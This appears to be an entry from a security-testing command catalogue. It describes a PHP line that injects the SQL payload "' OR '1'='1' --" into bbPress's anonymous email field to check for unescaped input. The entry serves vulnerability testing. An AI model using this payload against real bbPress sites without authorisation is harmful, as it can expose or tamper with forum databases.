---
id: cmd-bbpress-anon-test
data: '$_POST[''bbp_anonymous_email''] = "'' OR ''1''=''1'' --"; bbp_insert_topic_handler();'
tags:
  - sqli
  - bbpress
type: command
output: null
executor: php
platforms:
  - PHP
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:56.562Z'
verified: false
validated: true
submitted: true
---
# test-anon-post-payload

## Command

```php
$_POST['bbp_anonymous_email'] = "' OR '1'='1' --"; bbp_insert_topic_handler();
```

## Description

Simulates anonymous post submission in bbPress with SQLi payload in email field to test unescaped input handling.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_POST['bbp_anonymous_email'] | Payload in email field | Yes |

## Examples

### Basic Usage

```php
$_POST['bbp_anonymous_email'] = "' OR '1'='1' --";
bbp_insert_topic_handler();
```

## Expected Output

Injection alters query, e.g., all topics visible or error.

## Related

- [[procedures/Identify-Vulnerable-bbPress-Anonymous-Posting]]
